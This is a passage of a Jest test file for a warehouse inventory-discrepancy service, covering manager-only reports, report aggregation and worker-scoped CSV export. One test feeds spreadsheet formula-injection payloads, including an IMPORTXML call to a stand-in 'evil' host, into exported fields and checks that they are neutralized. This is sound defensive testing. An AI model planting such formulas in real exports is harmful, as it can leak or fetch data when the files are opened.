      caseNumber: "DSC-20260810-0001",
      workerId: "user-other",
    });
    await expect(service.audit("disc-1", workerActor)).rejects.toThrow(ForbiddenException);
  });
});

describe("DiscrepanciesService — reports", () => {
  test("reports are manager-only", async () => {
    const { service } = createPrismaMock();
    await expect(service.reports(workerActor)).rejects.toThrow(ForbiddenException);
  });

  test("reports are computed from real records only", async () => {
    const { prisma, service } = createPrismaMock();
    (prisma.discrepancy.groupBy as jest.Mock).mockImplementation(async (args: {
      by: string[];
      where?: {
        differenceQuantity?: { gt?: number; lt?: number };
        status?: string;
      };
    }) => {
      if (args.by[0] === "productId") {
        return [
          { productId: "prod-1", _count: { _all: 3 }, _sum: { differenceQuantity: -12 } },
        ];
      }
      if (args.by[0] === "locationId") {
        return [{ locationId: "loc-1", _count: { _all: 3 } }];
      }
      if (args.by[0] === "workerId") {
        return [{ workerId: "user-worker-1", _count: { _all: 3 } }];
      }
      if (args.by[0] === "severity") {
        return [
          { severity: DiscrepancySeverity.MAJOR, _count: { _all: 3 } },
        ];
      }
      if (args.by[0] === "status") {
      if (args.where?.differenceQuantity?.gt !== undefined) {
        return [{ status: "OPEN", _count: { _all: 1 }, _sum: { differenceQuantity: 4 } }];
      }
      if (args.where?.differenceQuantity?.lt !== undefined) {
        return [{ status: "OPEN", _count: { _all: 2 }, _sum: { differenceQuantity: -12 } }];
      }
        if (args.where?.status === DiscrepancyStatus.APPROVED) {
          return [{ status: DiscrepancyStatus.APPROVED, _count: { _all: 1 }, _sum: { differenceQuantity: -7 } }];
        }
        return [];
      }
      return [];
    });
    (prisma.product.findMany as jest.Mock).mockResolvedValue([
      { id: "prod-1", name: "Bottle", sku: "BTL-01" },
    ]);
    (prisma.location.findMany as jest.Mock).mockResolvedValue([
      { id: "loc-1", name: "Storage" },
    ]);
    (prisma.user.findMany as jest.Mock).mockResolvedValue([
      { id: "user-worker-1", displayName: "Worker One", employeeId: "WH101" },
    ]);
    (prisma.discrepancy.findMany as jest.Mock).mockImplementation(async (args: { select?: { resolvedAt?: boolean } }) => {
      if (args.select?.resolvedAt) {
        return [
          { createdAt: new Date("2026-08-10T10:00:00Z"), resolvedAt: new Date("2026-08-10T12:00:00Z") },
        ];
      }
      return [{ createdAt: new Date("2026-08-10T09:00:00Z") }];
    });
    (prisma.inventoryTransaction.findMany as jest.Mock).mockResolvedValue([
      { createdAt: new Date("2026-08-10T08:00:00Z") },
      { createdAt: new Date("2026-08-10T08:30:00Z") },
    ]);
    (prisma.discrepancyAuditEvent.count as jest.Mock).mockResolvedValue(1);

    const report = await service.reports(managerActor);
    expect(report.byProduct).toHaveLength(1);
    expect(report.byProduct[0]).toMatchObject({ name: "Bottle", cases: 3, netDifference: -12 });
    expect(report.byLocation).toHaveLength(1);
    expect(report.byWorker).toHaveLength(1);
    expect(report.severityDistribution[DiscrepancySeverity.MAJOR]).toBe(3);
    expect(report.differenceSplit).toEqual({
      positive: { cases: 1, units: 4 },
      negative: { cases: 2, units: 12 },
    });
    expect(report.recountFrequency).toBe(1);
    expect(report.approvedAdjustmentQuantity).toBe(7);
    expect(report.averageResolutionHours).toBe(2);
    expect(report.stockAccuracyTrend).toEqual([
      {
        month: "2026-08",
        cycleCounts: 2,
        discrepancies: 1,
        accuracy: 50,
      },
    ]);
  });
});

describe("DiscrepanciesService — CSV export", () => {
  test("exports readable headers and uses current filters for workers", async () => {
    const { prisma, service } = createPrismaMock();
    (prisma.discrepancy.findMany as jest.Mock).mockResolvedValue([
      {
        caseNumber: "DSC-20260810-0001",
        createdAt: new Date("2026-08-10T10:00:00Z"),
        expectedQuantity: 100,
        countedQuantity: 115,
        differenceQuantity: 15,
        differencePercentage: 15,
        severity: "MAJOR",
        status: "AWAITING_REVIEW",
        managerNotes: "Review needed",
        reasonCode: "COUNT_DIFFERENCE",
        product: { name: "Bottle", sku: "BTL-01" },
        location: { name: "Storage" },
        worker: { displayName: "Worker One" },
        assignedManager: { displayName: null },
        resolvedBy: { displayName: null },
      },
    ]);
    const result = await service.exportCsv(workerActor, { status: "AWAITING_REVIEW" });
    expect(result.filename).toMatch(/^discrepancies-\d{4}-\d{2}-\d{2}\.csv$/);
    const lines = result.csv.split("\r\n");
    expect(lines[0]).toContain("Case number");
    expect(lines[0]).toContain("Expected quantity");
    expect(lines[0]).toContain("Difference %");
    expect(lines[1]).toContain("DSC-20260810-0001");
    expect(lines[1]).toContain("115");
    // Worker export is always scoped to their own cases.
    const args = (prisma.discrepancy.findMany as jest.Mock).mock.calls[0][0];
    expect(args.where.workerId).toBe("user-worker-1");
    expect(args.where.status).toBe("AWAITING_REVIEW");
  });

  test("neutralizes spreadsheet formula injection", async () => {
    const { prisma, service } = createPrismaMock();
    (prisma.discrepancy.findMany as jest.Mock).mockResolvedValue([
      {
        caseNumber: "=IMPORTXML(\"http://evil\",\"x\")",
        createdAt: new Date("2026-08-10T10:00:00Z"),
        expectedQuantity: 1,
        countedQuantity: 1,
        differenceQuantity: 0,
        differencePercentage: 0,
        severity: "NONE",
        status: "CLOSED",
        managerNotes: "-5 + cmd",
        reasonCode: "COUNT_DIFFERENCE",
        product: { name: "@cmd", sku: "BTL-01" },
        location: { name: "Storage" },
        worker: { displayName: "+EVIL()" },
        assignedManager: { displayName: null },
        resolvedBy: { displayName: null },
      },
    ]);
    const result = await service.exportCsv(managerActor, {});
    const lines = result.csv.split("\r\n");
    const dataLine = lines[1];
    expect(dataLine).toContain("'=IMPORTXML");
    expect(dataLine).toContain("'@cmd");
    expect(dataLine).toContain("'+EVIL()");
    expect(dataLine).toContain("'-5 + cmd");
  });

  test("does not export another worker's data for a worker caller even with a workerId filter", async () => {
    const { prisma, service } = createPrismaMock();
    await service.exportCsv(workerActor, { workerId: "user-other-worker" });
    const args = (prisma.discrepancy.findMany as jest.Mock).mock.calls[0][0];
    expect(args.where.workerId).toBe("user-worker-1");
  });
});
